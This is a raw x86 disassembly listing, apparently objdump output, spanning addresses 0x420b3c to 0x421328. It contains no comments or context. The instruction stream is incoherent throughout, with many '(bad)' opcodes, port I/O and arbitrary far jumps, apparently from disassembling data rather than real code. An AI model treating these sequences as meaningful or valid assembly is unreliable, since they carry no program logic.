  420b3c:	sub    BYTE PTR [edx],al
  420b3e:	dec    eax
  420b3f:	and    DWORD PTR [ecx+0x2992275c],0x607def8f
  420b49:	mov    bh,0xb9
  420b4b:	or     DWORD PTR [ebx+0x39],ebp
  420b4e:	loope  0x420b04
  420b50:	or     DWORD PTR [edx],ebx
  420b52:	pop    ss
  420b53:	fisub  WORD PTR [ecx+eax*8+0x24]
  420b57:	adc    eax,0xecaed3e6
  420b5c:	mov    edx,0x504a784d
  420b61:	xchg   ecx,edx
  420b63:	in     eax,0xeb
  420b65:	test   eax,0xfaa476c3
  420b6a:	repz and al,0x64
  420b6d:	mov    edx,0xebf35ef
  420b72:	retf   
  420b73:	adc    BYTE PTR [ecx],0xb8
  420b76:	mov    ss,WORD PTR [ecx+0x42]
  420b79:	sahf   
  420b7a:	inc    ecx
  420b7b:	xchg   DWORD PTR [edi+0x29],ebx
  420b7e:	jnp    0x420bd5
  420b80:	or     BYTE PTR ds:0x33398a58,ch
  420b86:	pop    eax
  420b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b89:	dec    esp
  420b8a:	sub    eax,0xf6d4742e
  420b8f:	jg     0x420bfc
  420b91:	outs   dx,BYTE PTR ds:[esi]
  420b92:	ds adc ebx,edi
  420b95:	sub    ah,BYTE PTR [edi+eiz*1]
  420b98:	mov    ebx,0x1b98b9d9
  420b9d:	dec    edx
  420b9e:	outs   dx,DWORD PTR ds:[esi]
  420b9f:	mov    ds:0x57963746,eax
  420ba4:	pop    esp
  420ba5:	iret   
  420ba6:	mov    bl,0xab
  420ba8:	aad    0xd3
  420baa:	es dec eax
  420bac:	mov    cl,0xad
  420bae:	inc    ebp
  420baf:	bound  edx,QWORD PTR [eax+0x79]
  420bb2:	add    eax,0x50e15cff
  420bb7:	dec    esp
  420bb8:	outs   dx,BYTE PTR ds:[esi]
  420bb9:	mov    DWORD PTR [eax+edi*8-0x3a],edi
  420bbd:	test   DWORD PTR [ecx],esi
  420bbf:	repz or DWORD PTR [ebp+0x71659909],edi
  420bc6:	add    DWORD PTR [ecx-0x42],0xffffffd1
  420bca:	dec    ebx
  420bcb:	adc    BYTE PTR [edi+0x30],dh
  420bce:	retf   0xd1f6
  420bd1:	popf   
  420bd2:	nop
  420bd3:	int3   
  420bd4:	(bad)  
  420bd6:	sbb    al,0x30
  420bd8:	cmp    al,0xdc
  420bda:	pop    ebp
  420bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bdc:	retf   0x26bc
  420bdf:	pop    ds
  420be0:	call   0xda6c8331
  420be5:	sbb    eax,0x64acdb57
  420bea:	bswap  esp
  420bec:	rcr    bh,0x3
  420bef:	fld    QWORD PTR [ebp+0x6fbd24d9]
  420bf5:	fld    st(1)
  420bf7:	leave  
  420bf8:	popf   
  420bf9:	imul   ecx,edi,0x39858257
  420bff:	mov    esp,0x81f346ec
  420c04:	stos   BYTE PTR es:[edi],al
  420c05:	int3   
  420c06:	xchg   edi,eax
  420c07:	mov    ah,0x73
  420c09:	inc    ebx
  420c0a:	shl    BYTE PTR [edx],0xbc
  420c0d:	inc    ebp
  420c0e:	outs   dx,BYTE PTR ds:[esi]
  420c0f:	jnp    0x420bcb
  420c11:	(bad)  
  420c12:	pusha  
  420c13:	add    dh,bh
  420c15:	rcr    BYTE PTR [esi],0x54
  420c18:	jmp    0xeea7:0x6ad42efb
  420c1f:	or     esp,DWORD PTR [edi-0x7ae7e686]
  420c25:	and    eax,0x610565a3
  420c2a:	add    DWORD PTR [edx+0x4a5225ce],ecx
  420c30:	adc    eax,0x7d27998e
  420c35:	sbb    al,0x5f
  420c37:	arpl   cx,di
  420c39:	xor    eax,0x599328d8
  420c3e:	ins    BYTE PTR es:[edi],dx
  420c3f:	lods   eax,DWORD PTR ds:[esi]
  420c40:	retf   
  420c41:	bound  eax,QWORD PTR [ebx+0x8dc4b63]
  420c47:	test   eax,0xb2c9a4c8
  420c4c:	outs   dx,DWORD PTR ds:[esi]
  420c4d:	inc    eax
  420c4e:	dec    esp
  420c4f:	inc    esp
  420c50:	and    BYTE PTR [ebp+ebp*1-0x373881c5],0x98
  420c58:	in     eax,0x55
  420c5a:	jns    0x420c7c
  420c5c:	shr    DWORD PTR ds:0xb51774d6,cl
  420c62:	je     0x420bf4
  420c64:	inc    ebx
  420c65:	sub    DWORD PTR [esi+0x1056b29f],ebp
  420c6b:	call   0xf800b139
  420c70:	or     eax,0x1bbd22fe
  420c75:	push   ebx
  420c76:	pop    es
  420c77:	call   0x68f34c01
  420c7c:	lds    esi,FWORD PTR [esi+0x38237bb9]
  420c82:	aam    0xcd
  420c84:	push   0x6d
  420c86:	sbb    DWORD PTR [esi+0x3],eax
  420c89:	xor    al,0x27
  420c8b:	test   al,0xb9
  420c8d:	daa    
  420c8e:	cwde   
  420c8f:	xor    esi,edx
  420c91:	xchg   ebp,eax
  420c92:	(bad)
  420c95:	push   cs
  420c96:	fs mov edi,0x9c5d7edd
  420c9c:	loopne 0x420c7c
  420c9e:	in     eax,0xd1
  420ca0:	repz dec edi
  420ca2:	mov    bp,0x902d
  420ca6:	ins    BYTE PTR es:[edi],dx
  420ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ca8:	push   cs
  420ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420caa:	push   ebp
  420cab:	dec    ebx
  420cac:	inc    ecx
  420cad:	nop
  420cae:	sub    eax,0x29d37623
  420cb3:	xchg   BYTE PTR [edi],dh
  420cb5:	jmp    0x86015e90
  420cba:	popf   
  420cbb:	fisub  WORD PTR [ebp-0x559bb473]
  420cc1:	imul   edx,ecx,0x972e5fb5
  420cc7:	and    ah,BYTE PTR [esp+eiz*2-0x63]
  420ccb:	into   
  420ccc:	add    edi,DWORD PTR [ebx+0x491774be]
  420cd2:	dec    esp
  420cd3:	scas   eax,DWORD PTR es:[edi]
  420cd4:	ret    0xb1f3
  420cd7:	stc    
  420cd8:	repz popf 
  420cda:	jmp    0xf7a4f0de
  420cdf:	mov    dh,0x65
  420ce1:	mov    ah,0x8f
  420ce3:	push   esp
  420ce4:	add    eax,DWORD PTR [ebx]
  420ce6:	pop    ds
  420ce7:	stc    
  420ce8:	sbb    eax,0x67789812
  420ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cee:	or     cl,bh
  420cf0:	mov    ebp,0x44e1dc9b
  420cf5:	mov    esi,0xc577ffdb
  420cfa:	xor    ch,al
  420cfc:	loope  0x420c9b
  420cfe:	(bad)  
  420cff:	mov    ebx,0x32d0d66a
  420d04:	lock jnp 0x420d25
  420d07:	push   ebx
  420d08:	or     BYTE PTR [eax-0x52072a67],cl
  420d0e:	cmc    
  420d0f:	jns    0x420cef
  420d11:	(bad)  
  420d12:	jmp    0x420d2b
  420d14:	sbb    al,BYTE PTR [edx-0xd8a4ed4]
  420d1a:	repnz aad 0xad
  420d1d:	xor    edi,DWORD PTR [edi]
  420d1f:	mov    ah,BYTE PTR [edx+0x40]
  420d22:	cmp    eax,DWORD PTR [ebx]
  420d24:	xchg   DWORD PTR [ebx-0x3e],eax
  420d27:	fbstp  TBYTE PTR [edi]
  420d29:	retf   
  420d2a:	call   0x6cda:0x1d1d1dc8
  420d31:	xchg   ecx,eax
  420d32:	int3   
  420d33:	ins    BYTE PTR es:[edi],dx
  420d34:	aas    
  420d35:	imul   eax,edi,0xd15a5c94
  420d3b:	ja     0x420d9f
  420d3d:	mov    bl,dl
  420d3f:	pop    esi
  420d40:	mov    cl,0x60
  420d42:	(bad)  
  420d44:	xchg   ebx,eax
  420d45:	scas   al,BYTE PTR es:[edi]
  420d46:	(bad)  
  420d47:	in     eax,0x49
  420d49:	jge    0x420ce1
  420d4b:	sbb    ebp,edi
  420d4d:	in     al,dx
  420d4e:	cs jl  0x420d9a
  420d51:	sbb    DWORD PTR [esi+eax*4+0x139d6629],edi
  420d58:	fnstenv ds:0x998f8664
  420d5e:	in     eax,dx
  420d5f:	sahf   
  420d60:	std    
  420d61:	jle    0x420ced
  420d63:	jbe    0x420dd9
  420d65:	mov    ch,0x16
  420d67:	sbb    esi,DWORD PTR [esi+0x2e]
  420d6a:	sub    al,bl
  420d6c:	aam    0xbf
  420d6e:	(bad)  
  420d6f:	mov    edx,DWORD PTR [ebx+0x643ecf21]
  420d75:	sub    edx,edi
  420d77:	xchg   DWORD PTR [edx+0x1b],esp
  420d7a:	sbb    eax,0xa73453f4
  420d7f:	call   0x66273577
  420d84:	shr    DWORD PTR [eax],cl
  420d86:	fdiv   DWORD PTR [ebp-0xa77cf12]
  420d8c:	stos   BYTE PTR es:[edi],al
  420d8d:	repnz call FWORD PTR [eax-0x1e]
  420d91:	push   ds
  420d92:	mov    cl,0x36
  420d94:	jbe    0x420dab
  420d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d97:	call   0xf8c2:0x294f0a26
  420d9e:	shl    BYTE PTR [eax+0x4f98b4c1],0xee
  420da5:	inc    eax
  420da6:	cmp    ecx,DWORD PTR [esi+0x7d]
  420da9:	xchg   ebx,eax
  420daa:	popf   
  420dab:	sar    BYTE PTR [edx],1
  420dad:	xchg   ecx,eax
  420dae:	sub    BYTE PTR [edi-0x45a585b0],0xb8
  420db5:	ret    
  420db6:	iret   
  420db7:	fistp  WORD PTR [edi]
  420db9:	or     bl,al
  420dbb:	or     BYTE PTR [edx+edi*2],bh
  420dbe:	push   DWORD PTR [ecx+0x7428b419]
  420dc4:	je     0x420d63
  420dc6:	sbb    BYTE PTR [ebp+esi*2-0x4],cl
  420dca:	jae    0x420e10
  420dcc:	mov    esi,0x83d8ccde
  420dd1:	jno    0x420e15
  420dd3:	mov    edx,0xd7a6322c
  420dd8:	iret   
  420dd9:	sub    edi,DWORD PTR [edx-0x605dc708]
  420ddf:	shr    BYTE PTR [edi-0xf],0x59
  420de3:	and    DWORD PTR [eax-0x76],edx
  420de6:	scas   al,BYTE PTR es:[edi]
  420de7:	or     eax,0x6f768f7c
  420dec:	add    esp,DWORD PTR [eax+0x18027dd1]
  420df2:	jg     0x420da4
  420df4:	cmp    al,0x60
  420df6:	into   
  420df7:	mov    dl,0x1
  420df9:	pop    edi
  420dfa:	neg    DWORD PTR [edx+0x3496c0e5]
  420e00:	add    BYTE PTR [eax],0x55
  420e03:	push   ebp
  420e04:	add    eax,0x3183c664
  420e09:	sahf   
  420e0a:	xchg   edx,eax
  420e0b:	test   al,0xe5
  420e0d:	(bad)  
  420e0e:	cmp    DWORD PTR [edx],eax
  420e10:	push   ds
  420e11:	das    
  420e12:	lods   al,BYTE PTR ds:[esi]
  420e13:	push   eax
  420e14:	int    0xd0
  420e16:	arpl   WORD PTR ds:0xd890d420,di
  420e1c:	scas   al,BYTE PTR es:[edi]
  420e1d:	mov    ds:0x3bf119f1,al
  420e22:	(bad)  
  420e23:	and    ebp,DWORD PTR [ebp+0x3939aca6]
  420e29:	sub    edx,DWORD PTR [eax+0x2d]
  420e2c:	in     eax,0x66
  420e2e:	xor    ebx,DWORD PTR [ebx-0x32]
  420e31:	dec    ebx
  420e32:	pop    ebp
  420e33:	(bad)  
  420e34:	mov    ch,0x4a
  420e36:	out    dx,al
  420e37:	mov    bl,0xa9
  420e39:	and    al,0xf6
  420e3b:	lea    edx,[ecx-0x65]
  420e3e:	xchg   edx,eax
  420e3f:	push   0x5a
  420e41:	inc    edi
  420e42:	test   BYTE PTR [ebx],ah
  420e44:	jecxz  0x420e0d
  420e46:	mov    bl,0xe2
  420e48:	mov    dh,bh
  420e4a:	jnp    0x420dd8
  420e4c:	(bad)  
  420e4d:	shl    BYTE PTR [ebx+0x55],1
  420e50:	pop    ds
  420e51:	ja     0x420e32
  420e53:	pop    esi
  420e54:	das    
  420e55:	repz pop ecx
  420e57:	jge    0x420e80
  420e59:	fdivr  DWORD PTR [ecx-0x72]
  420e5c:	enter  0x22e3,0xc3
  420e60:	or     DWORD PTR [edx-0x5],esi
  420e63:	daa    
  420e64:	fdiv   QWORD PTR [edi]
  420e66:	mov    bl,0x3
  420e68:	mov    cl,0xce
  420e6a:	retf   0x5e18
  420e6d:	fstp   DWORD PTR [edx-0x46]
  420e70:	push   es
  420e71:	(bad)  
  420e73:	push   esi
  420e74:	das    
  420e75:	pop    ebx
  420e76:	dec    esp
  420e77:	mov    eax,ds:0x409688f4
  420e7c:	jbe    0x420e59
  420e7e:	xlat   BYTE PTR ds:[ebx]
  420e7f:	cmp    edx,DWORD PTR [esi+eax*1+0x68]
  420e83:	(bad)  
  420e84:	xchg   ebp,eax
  420e85:	dec    eax
  420e86:	in     al,dx
  420e87:	jmp    0x420e93
  420e89:	pop    edi
  420e8a:	lods   al,BYTE PTR ds:[esi]
  420e8b:	imul   BYTE PTR [esi+0x26dfc7c6]
  420e91:	fstp   QWORD PTR [ebx+ecx*2-0x5c50bb56]
  420e98:	and    BYTE PTR [eax],al
  420e9a:	push   ebp
  420e9b:	jmp    0xcd10:0x2a37e098
  420ea2:	lods   eax,DWORD PTR ds:[esi]
  420ea3:	fwait
  420ea4:	stos   BYTE PTR es:[edi],al
  420ea5:	xor    eax,0x47f39ab2
  420eaa:	and    eax,0x491a079d
  420eaf:	xor    BYTE PTR [eax+0x58],ah
  420eb2:	push   0x45bb9644
  420eb7:	mov    ah,0x8d
  420eb9:	into   
  420eba:	rcr    BYTE PTR [esi],0x25
  420ebd:	cwde   
  420ebe:	enter  0xd39,0x5e
  420ec2:	and    al,BYTE PTR [edi+0x6940c1fb]
  420ec8:	dec    esp
  420ec9:	test   BYTE PTR [edi],ah
  420ecb:	(bad)  
  420ecc:	clc    
  420ecd:	mov    DWORD PTR [edi-0x54],edx
  420ed0:	add    eax,0x84be9a5a
  420ed5:	cli    
  420ed6:	mov    cs,WORD PTR [edi-0x1a]
  420ed9:	adc    al,0x1d
  420edb:	inc    ebp
  420edc:	and    BYTE PTR [ebx],al
  420ede:	aad    0x5a
  420ee0:	dec    edx
  420ee1:	sub    al,BYTE PTR [esp+eax*8]
  420ee4:	sub    DWORD PTR [edx],ebx
  420ee6:	fstp   TBYTE PTR [ebx+eiz*2]
  420ee9:	add    eax,0x85550ba0
  420eee:	pop    esp
  420eef:	and    eax,0x6b525439
  420ef4:	push   ds
  420ef5:	push   cs
  420ef6:	and    BYTE PTR [esi],ah
  420ef8:	mov    ah,0xef
  420efa:	xchg   esp,eax
  420efb:	and    eax,0x32417d07
  420f00:	dec    ebx
  420f01:	cmp    al,0x5b
  420f03:	daa    
  420f04:	cli    
  420f05:	cmp    DWORD PTR [ebp+0x35],esp
  420f08:	in     eax,0xbd
  420f0a:	jbe    0x420f24
  420f0c:	and    eax,0xd88a39d8
  420f11:	imul   esi,DWORD PTR [ebx+0x1e],0x10
  420f15:	add    ebp,DWORD PTR [ecx-0x46]
  420f18:	icebp  
  420f19:	push   ebp
  420f1a:	and    al,0x14
  420f1c:	sbb    dl,cl
  420f1e:	out    0xa2,eax
  420f20:	pop    esp
  420f21:	cmp    bh,ch
  420f23:	in     eax,0x7c
  420f25:	sub    BYTE PTR [edx+esi*1-0x286e1cdb],bl
  420f2c:	add    ecx,DWORD PTR [ebx+0x2]
  420f2f:	adc    BYTE PTR [edi+0x2d],0xf2
  420f33:	sub    BYTE PTR [ebx+0x4bdbd392],0xca
  420f3a:	push   edx
  420f3b:	inc    edx
  420f3c:	push   es
  420f3d:	or     al,0x5d
  420f3f:	or     DWORD PTR [edx-0x485dbe94],ecx
  420f45:	inc    DWORD PTR [ebx-0x52]
  420f48:	test   eax,0xbdefba0a
  420f4d:	fs inc edi
  420f4f:	std    
  420f50:	ret    
  420f51:	imul   ecx,DWORD PTR [ebx],0xa0bbe688
  420f57:	ret    
  420f58:	es (bad) 
  420f5a:	and    eax,0x3e97563
  420f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f60:	cmp    eax,edi
  420f62:	push   cs
  420f63:	retf   
  420f64:	or     ecx,DWORD PTR [eax]
  420f66:	pop    ebp
  420f67:	mov    al,0x13
  420f69:	xchg   ecx,eax
  420f6a:	push   0x3b
  420f6c:	retf   
  420f6d:	dec    ebp
  420f6e:	sbb    ebx,DWORD PTR [edx+0x40]
  420f71:	(bad)  
  420f74:	mov    al,BYTE PTR [eax-0xd]
  420f77:	inc    edx
  420f78:	call   0x10c74a71
  420f7d:	or     eax,0x11c72174
  420f82:	ins    DWORD PTR es:[edi],dx
  420f83:	dec    ebp
  420f84:	ficomp WORD PTR [ebx-0x61]
  420f87:	mov    bh,0xd
  420f89:	call   0x88b26295
  420f8e:	mov    eax,ss:0xb192d86f
  420f94:	(bad)  
  420f96:	ds pop esp
  420f98:	dec    ebx
  420f99:	rcl    DWORD PTR [edi],0x92
  420f9c:	or     bl,BYTE PTR [edi]
  420f9e:	neg    DWORD PTR [ebp-0x3851ba]
  420fa4:	shr    DWORD PTR [esi+0x31],cl
  420fa7:	clc    
  420fa8:	mov    esp,0x68c5d16f
  420fad:	je     0x420f40
  420faf:	xchg   esp,eax
  420fb0:	push   0xf71a0089
  420fb5:	imul   esi,DWORD PTR [edi-0x1d3117fa],0xffffffca
  420fbc:	cli    
  420fbd:	fbld   TBYTE PTR [ebx-0x76]
  420fc0:	shl    DWORD PTR [edx],cl
  420fc2:	pop    esi
  420fc3:	mov    ebp,0xe4cad02d
  420fc8:	xchg   ebx,eax
  420fc9:	and    BYTE PTR [eax],ah
  420fcb:	sbb    eax,0xc6f51fcd
  420fd0:	push   0x49
  420fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fd3:	enter  0xe68c,0x8c
  420fd7:	adc    ebx,esp
  420fd9:	jp     0x42101a
  420fdb:	or     eax,DWORD PTR [ebx-0x606bf93]
  420fe1:	push   ebx
  420fe2:	adc    bl,bh
  420fe4:	add    DWORD PTR [edx-0x9dd615],ecx
  420fea:	ins    DWORD PTR es:[edi],dx
  420feb:	mov    eax,ds:0x96a6ba3d
  420ff0:	jmp    0x420f9a
  420ff2:	fwait
  420ff3:	dec    ebx
  420ff4:	mov    ds:0x3825d578,eax
  420ff9:	lahf   
  420ffa:	mov    BYTE PTR [ebp-0x3f2f1c2],dl
  421000:	jl     0x42102b
  421002:	cmp    eax,0xb72c73dc
  421007:	add    DWORD PTR [ecx-0x7],eax
  42100a:	loope  0x421008
  42100c:	inc    ebp
  42100d:	cmp    DWORD PTR [ebp+0x73],ebx
  421010:	int    0xe9
  421012:	adc    al,BYTE PTR [ebx]
  421014:	pop    edi
  421015:	dec    edi
  421016:	pop    esp
  421017:	jae    0x420fe0
  421019:	and    dl,BYTE PTR [ebx+0x2fda45b0]
  42101f:	dec    ecx
  421020:	jns    0x421064
  421022:	sub    eax,0x5fb552cd
  421027:	sub    eax,0xdb3f3499
  42102c:	mov    bl,0x3f
  42102e:	pusha  
  42102f:	test   bh,cl
  421031:	gs scas al,BYTE PTR es:[edi]
  421033:	add    DWORD PTR ds:0x4154533,0x72
  42103a:	call   0x61f4:0xed747c51
  421041:	push   0x41
  421043:	div    BYTE PTR [ecx]
  421045:	or     al,0xa1
  421047:	inc    ecx
  421048:	inc    BYTE PTR [ebp-0x146c2363]
  42104e:	jnp    0x4210cb
  421050:	mov    ds:0x23363867,al
  421055:	bound  edx,QWORD PTR [ecx]
  421057:	jl     0x4210bf
  421059:	cmp    al,0x92
  42105b:	sahf   
  42105c:	push   es
  42105d:	aaa    
  42105e:	add    BYTE PTR [ebx],ch
  421060:	and    BYTE PTR [ebp+0x79d77395],cl
  421066:	sub    ch,BYTE PTR [edx+0x4e]
  421069:	lahf   
  42106a:	clc    
  42106b:	into   
  42106c:	popa   
  42106d:	pop    es
  42106e:	cld    
  42106f:	mov    ds:0xac9f8d3e,al
  421074:	cdq    
  421075:	lea    edi,[edi+0x3126e323]
  42107b:	dec    esi
  42107c:	loope  0x42108c
  42107e:	cmp    bh,BYTE PTR [esi-0x3c]
  421081:	jbe    0x4210ec
  421083:	xchg   DWORD PTR [edi-0x37],ebx
  421086:	adc    DWORD PTR gs:[edx+0x61],edx
  42108a:	jmp    0x421070
  42108c:	test   eax,0xd01e780b
  421091:	fs jge 0x4210f1
  421094:	stc    
  421095:	ja     0x421061
  421097:	daa    
  421098:	push   es
  421099:	pushf  
  42109a:	xchg   ebx,eax
  42109b:	pop    esi
  42109c:	sub    al,0x5f
  42109e:	popa   
  42109f:	push   ss
  4210a0:	mov    ch,0x79
  4210a2:	adc    al,0xeb
  4210a4:	fdiv   QWORD PTR [ebx-0x5fb4f295]
  4210aa:	sbb    DWORD PTR fs:[ebx+0x6d7742a1],ebp
  4210b1:	icebp  
  4210b2:	or     eax,0xb389359e
  4210b7:	dec    ecx
  4210b8:	jecxz  0x421121
  4210ba:	adc    eax,0xafe757d6
  4210bf:	hlt    
  4210c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210c1:	pusha  
  4210c2:	jmp    0x421084
  4210c4:	sbb    al,0x44
  4210c6:	ret    
  4210c7:	outs   dx,BYTE PTR ds:[esi]
  4210c8:	xchg   edx,eax
  4210c9:	and    ch,dh
  4210cb:	push   esp
  4210cc:	and    eax,0x72fede15
  4210d1:	(bad)  
  4210d2:	dec    eax
  4210d3:	ds fwait
  4210d5:	push   ebx
  4210d6:	cdq    
  4210d7:	cmp    eax,0x99033dfe
  4210dc:	push   cs
  4210dd:	lahf   
  4210de:	add    ch,ch
  4210e0:	fsubr  QWORD PTR [eax+0x37c25115]
  4210e6:	xchg   ch,bh
  4210e8:	cmp    edi,ecx
  4210ea:	or     DWORD PTR [ecx+0x1b76ee8b],esp
  4210f0:	rcl    BYTE PTR [esi],1
  4210f2:	(bad)  
  4210f3:	fistp  DWORD PTR [esi-0x5d]
  4210f6:	ret    
  4210f7:	fnstsw WORD PTR [eax-0x42]
  4210fa:	mul    BYTE PTR [eax]
  4210fc:	dec    esp
  4210fd:	clc    
  4210fe:	sbb    bl,BYTE PTR [eax-0xb537a85]
  421104:	mul    DWORD PTR [edi+esi*8+0x26234e33]
  42110b:	sbb    eax,0x96886ed
  421110:	in     al,dx
  421111:	jmp    0xa3fe:0xe14d563b
  421118:	mov    ah,0xc8
  42111a:	or     DWORD PTR [edi-0x7f44e15f],ebp
  421120:	or     al,0x6e
  421122:	in     al,0xe4
  421124:	mov    es,WORD PTR [eax+0x79367217]
  42112a:	sub    edi,edx
  42112c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42112d:	push   edx
  42112e:	cmp    DWORD PTR [eax-0x48],0x37
  421132:	jle    0x4210b6
  421134:	or     eax,0x28a9040e
  421139:	popf   
  42113a:	pop    eax
  42113b:	xlat   BYTE PTR ds:[ebx]
  42113c:	inc    eax
  42113d:	ror    DWORD PTR [ecx+0x28],1
  421140:	stos   BYTE PTR es:[edi],al
  421141:	mov    cl,0xed
  421143:	cmp    edx,DWORD PTR [edi+0x496bfcbb]
  421149:	ja     0x4211c0
  42114b:	aad    0xd1
  42114d:	fwait
  42114e:	mov    edi,0xd0881b00
  421153:	adc    DWORD PTR [edi+0x3c],esi
  421156:	add    esi,ebp
  421158:	sbb    al,0x79
  42115a:	add    al,0x62
  42115c:	mov    ah,0x66
  42115e:	push   edi
  42115f:	pop    esp
  421160:	or     ebp,DWORD PTR [ecx-0x5ebad3f]
  421166:	mov    ch,0x74
  421168:	xor    DWORD PTR [ebx+eiz*2],0xffffffde
  42116c:	jmp    0x42110e
  42116e:	mov    esp,0x5c4917c1
  421173:	cmp    DWORD PTR [edi],edx
  421175:	mov    DWORD PTR ds:0x29518a6b,esp
  42117b:	or     DWORD PTR [edi+0x5d59f31c],edi
  421181:	and    bl,BYTE PTR [esi+edx*2]
  421184:	pusha  
  421185:	mov    dh,0xe
  421187:	mov    al,0x68
  421189:	jp     0x4211a1
  42118b:	dec    ecx
  42118c:	pushf  
  42118d:	test   eax,0x71659702
  421192:	inc    esi
  421193:	adc    eax,DWORD PTR [edi+eiz*1]
  421196:	repnz aas 
  421198:	pop    eax
  421199:	nop
  42119a:	imul   ebx,DWORD PTR [ecx-0x5183a932],0xd003a9fd
  4211a4:	mov    ds:0x714d31a7,al
  4211a9:	out    0x14,eax
  4211ab:	hlt    
  4211ac:	and    eax,0x2143a233
  4211b1:	scas   al,BYTE PTR es:[edi]
  4211b2:	push   esp
  4211b3:	call   0x13efaa61
  4211b8:	(bad)  
  4211b9:	gs jae 0x421188
  4211bc:	sub    bh,BYTE PTR [edi]
  4211be:	mov    ecx,0x4f2c33b
  4211c3:	inc    ecx
  4211c4:	or     cl,BYTE PTR [eax]
  4211c6:	out    dx,eax
  4211c7:	stos   BYTE PTR es:[edi],al
  4211c8:	out    dx,eax
  4211c9:	and    DWORD PTR [ebp-0x2ff5e51],0xffffffc6
  4211d0:	jnp    0x4211c1
  4211d2:	cli    
  4211d3:	gs mov cl,0x2d
  4211d6:	mov    ds:0x58be2e6a,eax
  4211db:	(bad)  
  4211dc:	or     cl,BYTE PTR [edx+0x0]
  4211df:	mov    esi,0x3deb4460
  4211e4:	xor    BYTE PTR [ebp-0x54],bh
  4211e7:	mov    fs,WORD PTR [esi]
  4211e9:	mov    eax,ds:0x2d02ffd
  4211ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ef:	in     al,0x98
  4211f1:	sbb    DWORD PTR [eax+ebx*4-0x26752d3e],esp
  4211f8:	fst    DWORD PTR [ebp+0x459a94bb]
  4211fe:	sub    eax,0xeccf78ee
  421203:	jle    0x4211f2
  421205:	sub    al,0x71
  421207:	or     DWORD PTR [ebx],edx
  421209:	xchg   ch,al
  42120b:	mov    bx,0x1aad
  42120f:	popf   
  421210:	pop    ecx
  421211:	or     BYTE PTR ds:0x22b4ea13,0x48
  421218:	dec    ebp
  421219:	jmp    0x5893:0xc1a3e310
  421220:	push   0x3c0abd37
  421225:	les    eax,FWORD PTR [edi-0x11dc0a3a]
  42122b:	mov    cl,0x34
  42122d:	adc    ch,bl
  42122f:	adc    DWORD PTR [ebp+0x53ed3c7f],ebx
  421235:	pop    ecx
  421236:	add    BYTE PTR ds:0x56842dea,cl
  42123c:	mov    ebx,0xbf411be0
  421241:	inc    ebx
  421242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421243:	je     0x421277
  421245:	test   eax,0xc3eae6b3
  42124a:	test   eax,0x2ecd624c
  42124f:	mov    eax,0x153cd039
  421254:	outs   dx,BYTE PTR ds:[esi]
  421255:	adc    eax,0x41956fc
  42125a:	fist   WORD PTR [ebp+esi*1-0x15f96cb8]
  421261:	mov    BYTE PTR [ecx+0x4443a4b7],al
  421267:	sub    BYTE PTR [esi],bh
  421269:	mov    ah,0x45
  42126b:	shl    DWORD PTR [esi-0x6d09fef9],0xdd
  421272:	inc    esp
  421273:	jp     0x42124c
  421275:	(bad)  
  421276:	cmp    esp,DWORD PTR [esi]
  421278:	mov    bh,0xa8
  42127a:	mov    bl,0x87
  42127c:	mov    edx,DWORD PTR [esi+0x7ba3a45a]
  421282:	pusha  
  421283:	mov    esp,edx
  421285:	or     DWORD PTR [edi-0x29bad5f9],esi
  42128b:	and    al,0xf1
  42128d:	mov    ds:0xa59a1dca,eax
  421292:	inc    edi
  421293:	les    edx,FWORD PTR [edi+0x15]
  421296:	lods   eax,DWORD PTR ds:[esi]
  421297:	or     bl,BYTE PTR [edx-0xde68ad3]
  42129d:	sbb    edi,0x69
  4212a0:	lock push ecx
  4212a2:	ja     0x42129a
  4212a4:	addr16 or al,0x49
  4212a7:	shl    BYTE PTR ds:0x6ca2ef5d,0x48
  4212ae:	or     esp,DWORD PTR [edx]
  4212b0:	out    0xc5,eax
  4212b2:	mov    BYTE PTR es:[eax+0x5dff027f],ch
  4212b9:	and    dl,BYTE PTR [edi]
  4212bb:	in     eax,0xeb
  4212bd:	pop    ebp
  4212be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212bf:	xchg   ebx,eax
  4212c0:	mov    edi,0x30515de6
  4212c5:	cwde   
  4212c6:	out    dx,al
  4212c7:	sbb    DWORD PTR [ebx],ecx
  4212c9:	jge    0x421303
  4212cb:	xlat   BYTE PTR ds:[ebx]
  4212cc:	mov    al,ds:0x14534d28
  4212d1:	and    bl,ch
  4212d3:	pop    esp
  4212d4:	(bad)  
  4212d5:	pop    ebx
  4212d6:	and    eax,0x6848c9c9
  4212db:	stos   BYTE PTR es:[edi],al
  4212dc:	mov    al,0x60
  4212de:	xchg   ecx,eax
  4212df:	push   ebx
  4212e0:	pop    esi
  4212e1:	rcl    DWORD PTR [esi-0x5fa72afe],0x95
  4212e8:	dec    ebp
  4212e9:	push   esi
  4212ea:	jge    0x421318
  4212ec:	xchg   ebp,eax
  4212ed:	jns    0x421360
  4212ef:	inc    esi
  4212f0:	and    DWORD PTR fs:[ebp+0x703ffcc6],ebx
  4212f7:	outs   dx,BYTE PTR ds:[esi]
  4212f8:	and    cl,ch
  4212fa:	and    DWORD PTR [ebp+0x0],0xea575681
  421301:	cmp    DWORD PTR [edi-0x2c66c898],esi
  421307:	outs   dx,BYTE PTR ds:[esi]
  421308:	shr    DWORD PTR [ebx],0x51
  42130b:	sahf   
  42130c:	inc    esi
  42130d:	cmp    BYTE PTR [esi],cl
  42130f:	popa   
  421310:	out    0x38,eax
  421312:	dec    esp
  421313:	pop    ecx
  421314:	and    esp,edx
  421316:	jns    0x42133e
  421318:	outs   dx,DWORD PTR ds:[esi]
  421319:	outs   dx,BYTE PTR ds:[esi]
  42131a:	mov    DWORD PTR ds:0x42757b45,ebp
  421320:	inc    ecx
  421321:	sbb    esp,ecx
  421323:	adc    eax,0x3a355544
  421328:	jb     0x42138a
